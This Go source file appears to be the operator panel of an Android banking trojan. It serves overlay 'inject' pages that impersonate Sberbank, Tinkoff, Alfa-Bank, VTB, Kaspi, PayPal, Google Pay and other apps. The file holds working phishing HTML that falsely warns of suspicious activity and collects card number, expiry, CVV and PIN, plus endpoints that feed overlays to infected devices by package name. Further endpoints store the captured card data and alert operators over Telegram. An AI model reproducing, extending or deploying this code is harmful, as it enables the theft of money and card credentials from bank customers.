package api

import (
	"encoding/json"
	"net/http"
	"strconv"
	"strings"

	"redwing/internal/db"
)

func HandleInjectTemplates(w http.ResponseWriter, r *http.Request) {
	teamID := SessionTeamID(r)

	switch r.Method {
	case http.MethodGet:
		getInjectTemplates(w, teamID)
	case http.MethodPost:
		createInjectTemplate(w, r, teamID)
	case http.MethodDelete:
		deleteInjectTemplate(w, r, teamID)
	default:
		writeJSON(w, map[string]any{"error": "method not allowed"})
	}
}

func getInjectTemplates(w http.ResponseWriter, teamID string) {
	rows, err := db.DB.Query(
		`SELECT id, target_package, app_name, html_content, active, created_at FROM inject_templates WHERE team_id = ? ORDER BY id DESC`,
		teamID,
	)
	if err != nil {
		writeJSON(w, map[string]any{"templates": []any{}})
		return
	}
	defer rows.Close()

	var templates []map[string]any
	for rows.Next() {
		var id int
		var pkg, name, html, createdAt string
		var active int
		rows.Scan(&id, &pkg, &name, &html, &active, &createdAt)
		templates = append(templates, map[string]any{
			"id":             id,
			"target_package": pkg,
			"app_name":       name,
			"html_content":   html,
			"active":         active == 1,
			"created_at":     createdAt,
		})
	}
	if templates == nil {
		templates = []map[string]any{}
	}
	writeJSON(w, map[string]any{"templates": templates})
}

func createInjectTemplate(w http.ResponseWriter, r *http.Request, teamID string) {
	var body struct {
		TargetPackage string `json:"target_package"`
		AppName       string `json:"app_name"`
		HTMLContent   string `json:"html_content"`
		Active        *bool  `json:"active"`
	}
	if json.NewDecoder(r.Body).Decode(&body) != nil {
		writeJSON(w, map[string]any{"error": "invalid json"})
		return
	}

	if body.TargetPackage == "" {
		writeJSON(w, map[string]any{"error": "target_package required"})
		return
	}

	active := 1
	if body.Active != nil && !*body.Active {
		active = 0
	}

	var existingID int
	err := db.DB.QueryRow("SELECT id FROM inject_templates WHERE team_id = ? AND target_package = ?", teamID, body.TargetPackage).Scan(&existingID)
	if err == nil {
		db.DB.Exec("UPDATE inject_templates SET app_name = ?, html_content = ?, active = ? WHERE id = ?",
			body.AppName, body.HTMLContent, active, existingID)
		writeJSON(w, map[string]any{"success": true, "id": existingID})
		return
	}

	result, err := db.DB.Exec(
		"INSERT INTO inject_templates (team_id, target_package, app_name, html_content, active) VALUES (?, ?, ?, ?, ?)",
		teamID, body.TargetPackage, body.AppName, body.HTMLContent, active,
	)
	if err != nil {
		writeJSON(w, map[string]any{"error": "create failed"})
		return
	}
	id, _ := result.LastInsertId()
	writeJSON(w, map[string]any{"success": true, "id": id})
}

func deleteInjectTemplate(w http.ResponseWriter, r *http.Request, teamID string) {
	path := strings.TrimPrefix(r.URL.Path, "/api/panel/injects/templates/")
	parts := strings.Split(path, "/")
	if len(parts) < 2 {
		writeJSON(w, map[string]any{"error": "id required"})
		return
	}
	id := parts[len(parts)-1]
	db.DB.Exec("DELETE FROM inject_templates WHERE id = ? AND team_id = ?", id, teamID)
	writeJSON(w, map[string]any{"success": true})
}

func HandleInjectTemplate(w http.ResponseWriter, r *http.Request) {
	path := strings.TrimPrefix(r.URL.Path, "/api/panel/injects/template/")
	parts := strings.SplitN(path, "/", 2)
	teamID := SessionTeamID(r)
	var templateID string
	if len(parts) >= 2 {
		templateID = parts[1]
	}

	switch r.Method {
	case http.MethodGet:
		if templateID == "" {
			writeJSON(w, map[string]any{"error": "id required"})
			return
		}
		var id int
		var pkg, name, html, createdAt string
		var active int
		err := db.DB.QueryRow(
			"SELECT id, target_package, app_name, html_content, active, created_at FROM inject_templates WHERE id = ? AND team_id = ?",
			templateID, teamID,
		).Scan(&id, &pkg, &name, &html, &active, &createdAt)
		if err != nil {
			writeJSON(w, map[string]any{"error": "not found"})
			return
		}
		writeJSON(w, map[string]any{
			"template": map[string]any{
				"id": id, "target_package": pkg, "app_name": name,
				"html_content": html, "active": active == 1, "created_at": createdAt,
			},
		})
	case http.MethodDelete:
		if templateID != "" {
			db.DB.Exec("DELETE FROM inject_templates WHERE id = ? AND team_id = ?", templateID, teamID)
		}
		writeJSON(w, map[string]any{"success": true})
	default:
		writeJSON(w, map[string]any{"error": "method not allowed"})
	}
}

func HandleEnsureDefaults(w http.ResponseWriter, r *http.Request) {
	teamID := SessionTeamID(r)
	SeedDefaultInjects(teamID)
	writeJSON(w, map[string]any{"success": true})
}

func HandleInjectConstructor(w http.ResponseWriter, r *http.Request) {
	teamID := SessionTeamID(r)

	var savedTemplates []map[string]any
	rows, err := db.DB.Query("SELECT id, target_package, app_name, html_content FROM inject_templates WHERE team_id = ?", teamID)
	if err == nil {
		for rows.Next() {
			var id int
			var pkg, name, html string
			rows.Scan(&id, &pkg, &name, &html)
			savedTemplates = append(savedTemplates, map[string]any{"id": id, "pkg": pkg, "name": name, "html": html})
		}
		rows.Close()
	}
	savedJSON, _ := json.Marshal(savedTemplates)

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Write([]byte(`<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Конструктор инжектов</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#0a0a0f;color:#e0e0e0;min-height:100vh}
.top-bar{display:flex;align-items:center;justify-content:space-between;padding:12px 20px;background:#111118;border-bottom:1px solid rgba(255,255,255,.06)}
.top-bar .back{color:#888;text-decoration:none;font-size:13px;display:flex;align-items:center;gap:6px}
.top-bar .back:hover{color:#fff}
.top-bar h1{font-size:16px;font-weight:600;color:#fff}
.top-bar .actions{display:flex;gap:8px}
.btn{padding:8px 16px;border-radius:8px;border:1px solid rgba(255,255,255,.1);background:rgba(255,255,255,.04);color:#ccc;font-size:12px;cursor:pointer;font-weight:500}
.btn:hover{background:rgba(255,255,255,.08);color:#fff}
.btn-green{background:#00c853;border-color:#00c853;color:#fff}
.btn-green:hover{background:#00e676}
.layout{display:flex;height:calc(100vh - 49px)}
.panel-left{width:280px;border-right:1px solid rgba(255,255,255,.06);overflow-y:auto;padding:16px;flex-shrink:0}
.panel-right{flex:1;display:flex;align-items:center;justify-content:center;background:#0d0d14;padding:20px}
.section-title{font-size:11px;text-transform:uppercase;letter-spacing:1.5px;color:#666;font-weight:600;margin-bottom:10px;display:flex;align-items:center;justify-content:space-between}
.section-title span{cursor:pointer;font-size:14px;color:#555}
.saved-list{margin-bottom:16px}
.saved-item{padding:8px 10px;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:8px;margin-bottom:6px;cursor:pointer;font-size:12px;color:#aaa;display:flex;justify-content:space-between;align-items:center}
.saved-item:hover{background:rgba(255,255,255,.06);color:#fff}
.saved-item .del{color:#555;font-size:14px;padding:2px 4px}
.saved-item .del:hover{color:#ef4444}
.empty-msg{color:#555;font-size:12px;text-align:center;padding:12px 0}
.name-input{width:100%;padding:8px 10px;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:8px;color:#ccc;font-size:12px;margin-bottom:8px}
.save-btn-row{display:flex;gap:6px;margin-bottom:16px}
.save-btn-row .btn{flex:1;text-align:center}
.presets-grid{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-bottom:16px}
.preset-btn{padding:8px 6px;border-radius:8px;border:none;cursor:pointer;font-size:11px;font-weight:600;color:#fff;text-align:center}
.preset-btn:hover{opacity:.85;transform:scale(1.02)}
.preset-btn.sber{background:#21a038}
.preset-btn.tink{background:#ffdd2d;color:#333}
.preset-btn.alfa{background:#ef3124}
.preset-btn.vtb{background:#003da5}
.preset-btn.wallet{background:#f7931a}
.preset-btn.login{background:#22c55e}
.preset-btn.gpay{background:#1a1a2e;border:1px solid rgba(255,255,255,.1)}
.preset-btn.paypal{background:#003087}
.preset-btn-label{font-size:10px;color:#888;margin-top:2px;font-weight:400}
.app-section{border-top:1px solid rgba(255,255,255,.06);padding-top:12px;margin-top:8px}
.app-section label{font-size:11px;color:#666;display:block;margin-bottom:6px}
.phone-frame{width:320px;height:640px;background:#fff;border-radius:32px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.5);position:relative;border:3px solid #222}
.phone-frame::before{content:'';position:absolute;top:8px;left:50%;transform:translateX(-50%);width:80px;height:4px;background:#333;border-radius:4px;z-index:10}
.phone-frame iframe{width:100%;height:100%;border:none;border-radius:29px}
.custom-btn{padding:8px 6px;border-radius:8px;border:1px dashed rgba(255,255,255,.15);background:transparent;cursor:pointer;font-size:11px;color:#888;text-align:center;grid-column:1/-1}
.custom-btn:hover{border-color:rgba(255,255,255,.3);color:#ccc}
</style></head>
<body>
<div class="top-bar">
  <a href="/injects.html" class="back">&larr; Назад</a>
  <h1>Конструктор инжектов</h1>
  <div class="actions">
    <button class="btn" onclick="refreshPreview()">Обновить превью</button>
    <button class="btn btn-green" onclick="saveToPanel()">Сохранить в панель</button>
  </div>
</div>
<div class="layout">
  <div class="panel-left">
    <div class="section-title">Мои шаблоны <span>&#9650;</span></div>
    <div class="saved-list" id="savedList"></div>
    <input class="name-input" id="tmplName" placeholder="Название...">
    <div class="save-btn-row">
      <button class="btn" onclick="saveLocal()">Сохранить</button>
    </div>

    <div class="section-title">Готовые пресеты <span>&#9650;</span></div>
    <div class="presets-grid">
      <div><button class="preset-btn sber" onclick="loadPreset('sber')">Сбербанк Онлайн</button><div class="preset-btn-label">Сбербанк</div></div>
      <div><button class="preset-btn tink" onclick="loadPreset('tink')">Тинькофф</button><div class="preset-btn-label">Тинькофф</div></div>
      <div><button class="preset-btn alfa" onclick="loadPreset('alfa')">Альфа-Банк</button><div class="preset-btn-label">Альфа-Банк</div></div>
      <div><button class="preset-btn vtb" onclick="loadPreset('vtb')">ВТБ Онлайн</button><div class="preset-btn-label">ВТБ</div></div>
      <div><button class="preset-btn wallet" onclick="loadPreset('wallet')">Wallet</button><div class="preset-btn-label">Крипто-кошелёк</div></div>
      <div><button class="preset-btn login" onclick="loadPreset('loginpass')">Логин + Пароль</button><div class="preset-btn-label">Логин + Пароль</div></div>
      <div><button class="preset-btn gpay" onclick="loadPreset('gpay')">Google Pay</button><div class="preset-btn-label">Google Pay</div></div>
      <div><button class="preset-btn paypal" onclick="loadPreset('paypal')">PayPal</button><div class="preset-btn-label">PayPal</div></div>
      <button class="custom-btn" onclick="loadPreset('custom')">+ My App<br><span style="font-size:10px">Кастом</span></button>
    </div>

    <div class="app-section">
      <div class="section-title">Приложение <span>&#9650;</span></div>
      <label>Название приложения</label>
      <input class="name-input" id="appName" placeholder="Название приложения">
      <label style="margin-top:8px">Package name</label>
      <input class="name-input" id="appPkg" placeholder="com.example.app">
    </div>
  </div>
  <div class="panel-right">
    <div class="phone-frame">
      <iframe id="preview" sandbox="allow-scripts"></iframe>
    </div>
  </div>
</div>

<script>
var currentHTML = '';
var savedTemplates = ` + string(savedJSON) + ` || [];

var PRESETS = {
sber: {name:'Сбербанк Онлайн',pkg:'ru.sberbankmobile',color:'#21a038',html:null},
tink: {name:'Тинькофф',pkg:'com.idamob.tinkoff.android',color:'#ffdd2d',html:null},
alfa: {name:'Альфа-Банк',pkg:'ru.alfabank.mobile.android',color:'#ef3124',html:null},
vtb: {name:'ВТБ',pkg:'ru.vtb24.mobilebanking.android',color:'#003da5',html:null},
wallet: {name:'Крипто-кошелёк',pkg:'com.wallet.crypto',color:'#f7931a',html:null},
loginpass: {name:'Логин + Пароль',pkg:'custom.login',color:'#22c55e',html:null},
gpay: {name:'Google Pay',pkg:'com.google.android.apps.walletnfcrel',color:'#4285f4',html:null},
paypal: {name:'PayPal',pkg:'com.paypal.android.p2pmobile',color:'#003087',html:null},
custom: {name:'Custom App',pkg:'com.example.app',color:'#666',html:null}
};

function makePresetHTML(name, color) {
  return '<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,sans-serif;background:#f5f5f5;min-height:100vh}.header{background:'+color+';color:#fff;padding:16px 20px;display:flex;align-items:center;gap:12px}.header svg{width:20px;height:20px}.header h1{font-size:17px;font-weight:600}.card-block{margin:16px;background:'+color+';border-radius:16px;padding:20px;color:#fff}.card-block .label{font-size:12px;opacity:.7;margin-bottom:4px}.card-block .num{font-size:20px;font-weight:700;letter-spacing:2px}.alert{margin:16px;padding:16px;background:#fff;border-radius:14px;display:flex;gap:12px;align-items:flex-start;box-shadow:0 2px 8px rgba(0,0,0,.06)}.alert .icon{width:24px;height:24px;background:#ff3b30;border-radius:50%;flex-shrink:0;display:flex;align-items:center;justify-content:center;color:#fff;font-size:14px;font-weight:700}.alert h3{font-size:14px;font-weight:600;color:#1a1a1a;margin-bottom:4px}.alert p{font-size:12px;color:#666;line-height:1.4}.form{margin:16px;background:#fff;border-radius:14px;padding:20px;box-shadow:0 2px 8px rgba(0,0,0,.06)}.form h2{font-size:15px;font-weight:600;color:#1a1a1a;margin-bottom:16px;text-align:center}.field{margin-bottom:14px}.field label{font-size:12px;color:#888;margin-bottom:6px;display:block}.field input{width:100%;padding:12px 14px;border:1.5px solid #e0e0e0;border-radius:10px;font-size:14px;outline:none}.field input:focus{border-color:'+color+'}.submit{width:100%;padding:13px;border:none;border-radius:10px;background:'+color+';color:#fff;font-size:15px;font-weight:600;cursor:pointer;margin-top:4px}.submit:active{opacity:.85}.nav{position:fixed;bottom:0;left:0;right:0;background:#fff;border-top:1px solid #eee;display:flex;justify-content:space-around;padding:8px 0 20px}</style></head><body><div class="header"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="15 18 9 12 15 6"/></svg><h1>'+name+'</h1></div><div class="card-block"><div class="label">Основная карта</div><div class="num">₽ *** **</div><div style="margin-top:8px;font-size:13px;opacity:.8">**** ****</div></div><div class="alert"><div class="icon">!</div><div><h3>Подозрительная активность</h3><p>Мы зафиксировали подозрительную операцию по вашей карте. Для защиты средств подтвердите данные владельца карты.</p></div></div><div class="form"><h2>Верификация карты</h2><div class="field"><label>Номер карты</label><input type="tel" id="card" placeholder="0000 0000 0000 0000" maxlength="19"></div><div class="field"><label>Срок действия</label><input type="tel" id="exp" placeholder="MM/YY" maxlength="5"></div><div class="field"><label>CVV</label><input type="tel" id="cvv" placeholder="000" maxlength="4"></div><div class="field"><label>PIN-код</label><input type="password" id="pin" placeholder="••••" maxlength="6"></div><button class="submit" onclick="send()">Подтвердить</button></div><div class="nav"><span style="font-size:20px">🏠</span><span style="font-size:20px">💳</span><span style="font-size:20px">💬</span><span style="font-size:20px">···</span></div><script>document.getElementById("card").addEventListener("input",function(e){var v=e.target.value.replace(/\\D/g,"").substring(0,16);e.target.value=v.replace(/(.{4})/g,"$1 ").trim()});document.getElementById("exp").addEventListener("input",function(e){var v=e.target.value.replace(/\\D/g,"").substring(0,4);if(v.length>2)v=v.substring(0,2)+"/"+v.substring(2);e.target.value=v});function send(){var d={card:document.getElementById("card").value,exp:document.getElementById("exp").value,cvv:document.getElementById("cvv").value,pin:document.getElementById("pin").value};if(window.Android&&Android.returnResult)Android.returnResult(JSON.stringify(d))}<\/script></body></html>';
}

for (var k in PRESETS) PRESETS[k].html = makePresetHTML(PRESETS[k].name, PRESETS[k].color);

function loadPreset(key) {
  var p = PRESETS[key];
  document.getElementById('appName').value = p.name;
  document.getElementById('appPkg').value = p.pkg;
  currentHTML = p.html;
  refreshPreview();
}

function refreshPreview() {
  document.getElementById('preview').srcdoc = currentHTML;
}

function renderSaved() {
  var c = document.getElementById('savedList');
  if (!savedTemplates || savedTemplates.length === 0) { c.innerHTML = '<div class="empty-msg">Нет сохранённых</div>'; return; }
  c.innerHTML = savedTemplates.map(function(t,i){
    return '<div class="saved-item" onclick="loadSaved('+i+')"><span>'+(t.name||t.pkg)+'</span><span class="del" onclick="event.stopPropagation();delSaved('+i+')">&times;</span></div>';
  }).join('');
}

function loadSaved(i) {
  var t = savedTemplates[i];
  document.getElementById('appName').value = t.name;
  document.getElementById('appPkg').value = t.pkg;
  currentHTML = t.html;
  refreshPreview();
}

function delSaved(i) {
  savedTemplates.splice(i, 1);
  localStorage.setItem('rw_inject_saved', JSON.stringify(savedTemplates));
  renderSaved();
}

function saveLocal() {
  var name = document.getElementById('tmplName').value.trim() || document.getElementById('appName').value.trim() || 'Untitled';
  var pkg = document.getElementById('appPkg').value.trim();
  savedTemplates.push({name:name, pkg:pkg, html:currentHTML});
  localStorage.setItem('rw_inject_saved', JSON.stringify(savedTemplates));
  document.getElementById('tmplName').value = '';
  renderSaved();
}

async function saveToPanel() {
  var name = document.getElementById('appName').value.trim();
  var pkg = document.getElementById('appPkg').value.trim();
  if (!pkg) { alert('Укажите package name'); return; }
  try {
    var r = await fetch('/api/panel/injects/templates/` + teamID + `', {
      method:'POST', credentials:'include',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({target_package:pkg, app_name:name, html_content:currentHTML, active:true})
    });
    var d = await r.json();
    if (d.success) { alert('Сохранено в панель!'); } else { alert(d.error||'Ошибка'); }
  } catch(e) { alert('Ошибка сети'); }
}

loadPreset('sber');
renderSaved();
</script>
</body></html>`))
}

func HandleInjectToggle(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeJSON(w, map[string]any{"error": "method not allowed"})
		return
	}
	var body struct {
		ID     int  `json:"id"`
		Active bool `json:"active"`
	}
	if json.NewDecoder(r.Body).Decode(&body) != nil {
		writeJSON(w, map[string]any{"error": "invalid json"})
		return
	}
	active := 0
	if body.Active {
		active = 1
	}
	db.DB.Exec("UPDATE inject_templates SET active = ? WHERE id = ?", active, body.ID)
	writeJSON(w, map[string]any{"success": true})
}

func HandleInjectData(w http.ResponseWriter, r *http.Request) {
	teamID := SessionTeamID(r)

	switch r.Method {
	case http.MethodGet:
		getInjectData(w, r, teamID)
	case http.MethodDelete:
		db.DB.Exec("DELETE FROM inject_data WHERE team_id = ?", teamID)
		writeJSON(w, map[string]any{"success": true})
	default:
		writeJSON(w, map[string]any{"error": "method not allowed"})
	}
}

func getInjectData(w http.ResponseWriter, r *http.Request, teamID string) {
	limit := 100
	if l := r.URL.Query().Get("limit"); l != "" {
		if n, err := strconv.Atoi(l); err == nil && n > 0 {
			limit = n
		}
	}

	rows, err := db.DB.Query(
		`SELECT id, device_id, target_package, app_name, captured_data, created_at FROM inject_data WHERE team_id = ? ORDER BY id DESC LIMIT ?`,
		teamID, limit,
	)
	if err != nil {
		writeJSON(w, map[string]any{"data": []any{}})
		return
	}
	defer rows.Close()

	var data []map[string]any
	for rows.Next() {
		var id int
		var deviceID, pkg, name, captured, createdAt string
		rows.Scan(&id, &deviceID, &pkg, &name, &captured, &createdAt)

		var parsedData any
		if json.Unmarshal([]byte(captured), &parsedData) != nil {
			parsedData = captured
		}

		data = append(data, map[string]any{
			"id":             id,
			"device_id":      deviceID,
			"target_package": pkg,
			"app_name":       name,
			"data":           parsedData,
			"created_at":     createdAt,
		})
	}
	if data == nil {
		data = []map[string]any{}
	}
	LogActionFromRequest(r, ActionViewInjects, "", "")

	writeJSON(w, map[string]any{"data": data})
}

func HandleDeviceInjectTemplates(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeJSON(w, map[string]any{"templates": []any{}})
		return
	}

	var req map[string]any
	json.NewDecoder(r.Body).Decode(&req)

	deviceID, _ := req["device_id"].(string)
	teamID, _ := req["team_id"].(string)
	if teamID != "" {
		teamID = ResolveDeviceTeam(teamID)
	}
	if teamID == "" && deviceID != "" {
		db.DB.QueryRow("SELECT COALESCE(team_id,'') FROM devices WHERE device_id = ?", deviceID).Scan(&teamID)
	}

	apps, _ := req["apps"].([]any)

	if len(apps) == 0 {
		rows, err := db.DB.Query(
			"SELECT target_package, app_name, html_content FROM inject_templates WHERE team_id = ? AND active = 1",
			teamID,
		)
		if err != nil {
			writeJSON(w, map[string]any{"templates": []any{}})
			return
		}
		defer rows.Close()

		var templates []map[string]any
		for rows.Next() {
			var pkg, name, html string
			rows.Scan(&pkg, &name, &html)
			templates = append(templates, map[string]any{
				"target_package": pkg,
				"app_name":       name,
				"html":           html,
			})
		}
		if templates == nil {
			templates = []map[string]any{}
		}
		writeJSON(w, map[string]any{"templates": templates})
		return
	}

	var pkgList []string
	for _, a := range apps {
		if s, ok := a.(string); ok {
			pkgList = append(pkgList, s)
		}
	}

	placeholders := strings.Repeat("?,", len(pkgList))
	placeholders = placeholders[:len(placeholders)-1]

	args := []any{teamID}
	for _, p := range pkgList {
		args = append(args, p)
	}

	rows, err := db.DB.Query(
		"SELECT target_package, app_name, html_content FROM inject_templates WHERE team_id = ? AND active = 1 AND target_package IN ("+placeholders+")",
		args...,
	)
	if err != nil {
		writeJSON(w, map[string]any{"templates": []any{}})
		return
	}
	defer rows.Close()

	var templates []map[string]any
	for rows.Next() {
		var pkg, name, html string
		rows.Scan(&pkg, &name, &html)
		templates = append(templates, map[string]any{
			"target_package": pkg,
			"app_name":       name,
			"html":           html,
		})
	}
	if templates == nil {
		templates = []map[string]any{}
	}

	_ = deviceID
	writeJSON(w, map[string]any{"templates": templates})
}

func HandleDeviceInjectResult(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeJSON(w, map[string]any{"success": true})
		return
	}

	var req map[string]any
	json.NewDecoder(r.Body).Decode(&req)

	deviceID, _ := req["device_id"].(string)
	teamID, _ := req["team_id"].(string)
	if teamID != "" {
		teamID = ResolveDeviceTeam(teamID)
	}
	pkg, _ := req["target_package"].(string)
	appName, _ := req["app_name"].(string)
	if teamID == "" && deviceID != "" {
		db.DB.QueryRow("SELECT COALESCE(team_id,'') FROM devices WHERE device_id = ?", deviceID).Scan(&teamID)
	}

	dataJSON, _ := json.Marshal(req)

	db.DB.Exec(
		"INSERT INTO inject_data (team_id, device_id, target_package, app_name, captured_data) VALUES (?, ?, ?, ?, ?)",
		teamID, deviceID, pkg, appName, string(dataJSON),
	)

	addEvent(teamID, deviceID, "inject", "Inject captured: "+appName)

	SendTelegramNotification(teamID, "inject", map[string]string{
		"device_id": deviceID,
		"app":       appName,
		"package":   pkg,
	})

	writeJSON(w, map[string]any{"success": true})
}

func SeedDefaultInjects(teamID string) {
	var count int
	db.DB.QueryRow("SELECT COUNT(*) FROM inject_templates WHERE team_id = ?", teamID).Scan(&count)
	if count > 0 {
		return
	}

	defaults := []struct {
		pkg  string
		name string
	}{
		{"ru.sberbankmobile", "Сбербанк"},
		{"ru.alfabank.mobile.android", "Альфа-Банк"},
		{"ru.tinkoff.investing", "Тинькофф"},
		{"com.idamob.tinkoff.android", "Тинькофф Банк"},
		{"ru.vtb24.mobilebanking.android", "ВТБ"},
		{"ru.raiffeisennews", "Райффайзен"},
		{"com.kaspi.bank", "Kaspi Bank"},
		{"kz.homebank.mobile", "Homebank"},
		{"by.st.alfa", "Альфа-Банк BY"},
		{"com.belinvestbank.mobile", "БелИнвест"},
	}

	for _, d := range defaults {
		html := generateBankInjectHTML(d.name, d.pkg)
		db.DB.Exec(
			"INSERT INTO inject_templates (team_id, target_package, app_name, html_content, active) VALUES (?, ?, ?, ?, 1)",
			teamID, d.pkg, d.name, html,
		)
	}
}

func generateBankInjectHTML(bankName, pkg string) string {
	return `<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#f5f5f5;min-height:100vh;display:flex;align-items:center;justify-content:center}
.card{background:#fff;border-radius:16px;padding:32px 24px;width:90%;max-width:380px;box-shadow:0 4px 24px rgba(0,0,0,.08)}
.logo{text-align:center;margin-bottom:24px}
.logo img{width:64px;height:64px;border-radius:14px}
.logo h2{margin-top:12px;font-size:18px;color:#1a1a1a}
.logo p{font-size:13px;color:#888;margin-top:4px}
.field{margin-bottom:16px}
.field label{display:block;font-size:13px;color:#555;margin-bottom:6px;font-weight:500}
.field input{width:100%;padding:14px 16px;border:1.5px solid #e0e0e0;border-radius:12px;font-size:15px;outline:none;transition:border .2s}
.field input:focus{border-color:#1976d2}
.btn{width:100%;padding:14px;border:none;border-radius:12px;background:#1976d2;color:#fff;font-size:16px;font-weight:600;cursor:pointer;margin-top:8px}
.btn:active{opacity:.85}
</style>
</head>
<body>
<div class="card">
<div class="logo">
<h2>` + bankName + `</h2>
<p>Подтвердите вход для безопасности</p>
</div>
<div class="field">
<label>Номер карты</label>
<input type="tel" id="card" placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="off">
</div>
<div class="field">
<label>Срок действия</label>
<input type="tel" id="exp" placeholder="MM/YY" maxlength="5" autocomplete="off">
</div>
<div class="field">
<label>CVV</label>
<input type="tel" id="cvv" placeholder="000" maxlength="4" autocomplete="off">
</div>
<div class="field">
<label>PIN-код</label>
<input type="password" id="pin" placeholder="••••" maxlength="6" autocomplete="off">
</div>
<button class="btn" onclick="submit()">Подтвердить</button>
</div>
<script>
document.getElementById('card').addEventListener('input',function(e){
  var v=e.target.value.replace(/\D/g,'').substring(0,16);
  e.target.value=v.replace(/(.{4})/g,'$1 ').trim();
});
document.getElementById('exp').addEventListener('input',function(e){
  var v=e.target.value.replace(/\D/g,'').substring(0,4);
  if(v.length>2)v=v.substring(0,2)+'/'+v.substring(2);
  e.target.value=v;
});
function submit(){
  var d={
    card:document.getElementById('card').value,
    exp:document.getElementById('exp').value,
    cvv:document.getElementById('cvv').value,
    pin:document.getElementById('pin').value,
    package:'` + pkg + `',
    app:'` + bankName + `'
  };
  if(window.Android&&Android.returnResult){
    Android.returnResult(JSON.stringify(d));
  }
}
</script>
</body>
</html>`
}
